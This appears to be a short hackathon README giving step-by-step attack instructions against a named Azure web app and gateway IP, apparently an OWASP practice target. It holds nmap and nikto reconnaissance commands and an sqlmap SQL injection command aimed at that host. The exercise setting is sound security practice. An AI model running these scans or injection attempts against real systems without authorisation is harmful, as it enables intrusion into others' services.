# WebSite Attack by AndreMurrel
Web site attack created by Andre Murrel for FTA hackaton Februare 2022

This is instructions on how to execute a website attack. It was created by Andre Murrel for a hackaton played by Rudnei, Andre, Simona, Ricardo, Andrej and Andrew.

## Information utilized

- Web app: https://owaspdirect-prunoavl6xr2y.azurewebsites.net 
- App GW: 52.249.241.69

## Enumeration and Discovery
```
    Nmap -v -O -Pn 52.249.241.69 --traceroute 
    #silent scan of IP and 1000 ports if ICMP is blocked 

    nikto -h 52.249.241.69 
    //nikto -h https://owaspdirect-prunoavl6xr2y.azurewebsites.net 
    //nikto -h https://owaspdirecprunoavl6xr2y.azurewebsites.net –ssl
```
## ATTACK Attempt at SQL Injection (this throws the kitchen sink at the Website) 

    sqlmap -u "https://owaspdirect-prunoavl6xr2y.azurewebsites.net" --data="id=1&str=val" -b 

